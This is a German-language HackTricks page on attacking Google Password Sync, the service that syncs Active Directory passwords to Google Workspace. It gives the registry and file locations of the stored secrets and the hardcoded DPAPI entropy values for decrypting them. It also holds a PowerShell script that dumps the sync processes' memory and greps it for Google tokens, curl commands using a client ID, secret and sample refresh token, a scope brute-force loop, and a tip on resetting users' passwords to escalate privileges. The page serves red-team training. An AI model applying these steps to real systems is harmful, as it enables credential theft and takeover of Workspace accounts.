# GPS - Google Password Sync

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundinformationen

Dies ist die Bin√§rdatei und der Dienst, den Google anbietet, um die **Passw√∂rter der Benutzer zwischen dem AD** und Workspace **synchronisiert zu halten**. Jedes Mal, wenn ein Benutzer sein Passwort im AD √§ndert, wird es in Google gesetzt.

Es wird in `C:\Program Files\Google\Password Sync` installiert, wo du die Bin√§rdatei `PasswordSync.exe` zur Konfiguration und `password_sync_service.exe` (der Dienst, der weiterhin l√§uft) findest.

### GPS - Konfiguration

Um diese Bin√§rdatei (und den Dienst) zu konfigurieren, ist es notwendig, **einen Super Admin-Prinzipal in Workspace Zugriff zu gew√§hren**:

* Anmeldung √ºber **OAuth** mit Google, danach wird **ein Token im Registrierungseditor (verschl√ºsselt) gespeichert**
* Nur verf√ºgbar auf Dom√§nencontrollern mit GUI
* Bereitstellung von **Service Account-Anmeldeinformationen von GCP** (json-Datei) mit Berechtigungen zur **Verwaltung der Workspace-Benutzer**
* Sehr schlechte Idee, da diese Anmeldeinformationen niemals ablaufen und missbraucht werden k√∂nnten
* Sehr schlechte Idee, einem SA Zugriff auf Workspace zu gew√§hren, da der SA in GCP kompromittiert werden k√∂nnte und es m√∂glich w√§re, zu Workspace zu pivotieren
* Google verlangt dies f√ºr dom√§nenkontrollierte Umgebungen ohne GUI
* Diese Anmeldeinformationen werden ebenfalls im Registrierungseditor gespeichert

Bez√ºglich AD ist es m√∂glich, anzugeben, dass der aktuelle **Anwendungskontext, anonym oder einige spezifische Anmeldeinformationen** verwendet werden sollen. Wenn die Anmeldeinformationsoption ausgew√§hlt ist, wird der **Benutzername** in einer Datei auf der **Festplatte** gespeichert und das **Passwort** ist **verschl√ºsselt** und im **Registrierungseditor** gespeichert.

### GPS - Dumping Passwort und Token von der Festplatte

{% hint style="success" %}
Beachte, dass [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) in der Lage ist, **GPS** zu erkennen, Informationen √ºber die Konfiguration zu erhalten und **sogar das Passwort und Token zu entschl√ºsseln**.
{% endhint %}

In der Datei **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** ist es m√∂glich, Teile der Konfiguration wie den **`baseDN`** des konfigurierten AD und den **`Benutzernamen`**, dessen Anmeldeinformationen verwendet werden, zu finden.

Im Registrierungseditor **`HKLM\Software\Google\Google Apps Password Sync`** ist es m√∂glich, das **verschl√ºsselte Refresh-Token** und das **verschl√ºsselte Passwort** f√ºr den AD-Benutzer (falls vorhanden) zu finden. Dar√ºber hinaus, wenn anstelle eines Tokens einige **SA-Anmeldeinformationen** verwendet werden, ist es auch m√∂glich, diese verschl√ºsselt an dieser Registrierungsadresse zu finden. Die **Werte** in dieser Registrierung sind nur f√ºr **Administratoren** **zug√§nglich**.

Das verschl√ºsselte **Passwort** (falls vorhanden) befindet sich im Schl√ºssel **`ADPassword`** und ist mit der **`CryptProtectData`** API verschl√ºsselt. Um es zu entschl√ºsseln, musst du der gleiche Benutzer sein wie der, der die Passwortsynchronisierung konfiguriert hat, und diese **Entropie** verwenden, wenn du die **`CryptUnprotectData`** verwendest: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Das verschl√ºsselte Token (falls vorhanden) befindet sich im Schl√ºssel **`AuthToken`** und ist mit der **`CryptProtectData`** API verschl√ºsselt. Um es zu entschl√ºsseln, musst du der gleiche Benutzer sein wie der, der die Passwortsynchronisierung konfiguriert hat, und diese **Entropie** verwenden, wenn du die **`CryptUnprotectData`** verwendest: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Dar√ºber hinaus ist es auch mit base32hex unter Verwendung des W√∂rterbuchs **`0123456789abcdefghijklmnopqrstv`** codiert.

Die Entropiewerte wurden mit dem Tool gefunden. Es wurde konfiguriert, um die Aufrufe zu **`CryptUnprotectData`** und **`CryptProtectData`** zu √ºberwachen, und dann wurde das Tool verwendet, um `PasswordSync.exe` zu starten und zu √ºberwachen, das zu Beginn das konfigurierte Passwort und Auth-Token entschl√ºsseln wird, und das Tool wird **die Werte f√ºr die verwendete Entropie** in beiden F√§llen anzeigen:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Beachte, dass es auch m√∂glich ist, die **entschl√ºsselten** Werte in den Eingaben oder Ausgaben der Aufrufe zu diesen APIs zu sehen (f√ºr den Fall, dass Winpeas irgendwann nicht mehr funktioniert).

Falls die Passwortsynchronisierung **mit SA-Anmeldeinformationen konfiguriert wurde**, wird sie ebenfalls in Schl√ºsseln im Registrierungseditor **`HKLM\Software\Google\Google Apps Password Sync`** gespeichert.

### GPS - Dumping Tokens aus dem Speicher

Genau wie bei GCPW ist es m√∂glich, den Speicher des Prozesses von `PasswordSync.exe` und `password_sync_service.exe` zu dumpen, und du wirst in der Lage sein, Refresh- und Zugriffstoken zu finden (falls sie bereits generiert wurden).\
Ich nehme an, du k√∂nntest auch die konfigurierten AD-Anmeldeinformationen finden.

<details>

<summary>Dump <code>PasswordSync.exe</code> und die <code>password_sync_service.exe</code> Prozesse und suche nach Tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Zugriffstoken aus Aktualisierungstoken generieren

Mit dem Aktualisierungstoken ist es m√∂glich, Zugriffstoken zu generieren, indem es zusammen mit der Client-ID und dem Client-Geheimnis verwendet wird, die im folgenden Befehl angegeben sind:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Beachten Sie, dass es selbst mit einem Refresh-Token nicht m√∂glich ist, einen beliebigen Scope f√ºr das Access-Token anzufordern, da Sie nur die **Scopes anfordern k√∂nnen, die von der Anwendung unterst√ºtzt werden, in der Sie das Access-Token generieren**.

Au√üerdem ist das Refresh-Token nicht in jeder Anwendung g√ºltig.
{% endhint %}

Standardm√§√üig hat GPS nicht als Benutzer Zugriff auf jeden m√∂glichen OAuth-Scope. Mit dem folgenden Skript k√∂nnen wir die Scopes finden, die mit dem `refresh_token` verwendet werden k√∂nnen, um ein `access_token` zu generieren:

<details>

<summary>Bash-Skript zum Brute-Forcen von Scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Und dies ist die Ausgabe, die ich zum Zeitpunkt des Schreibens erhalten habe:
```
https://www.googleapis.com/auth/admin.directory.user
```
Welches dasselbe ist, was Sie erhalten, wenn Sie keinen Geltungsbereich angeben.

{% hint style="danger" %}
Mit diesem Geltungsbereich k√∂nnten Sie **das Passwort eines bestehenden Benutzers √§ndern, um Privilegien zu eskalieren**.
{% endhint %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
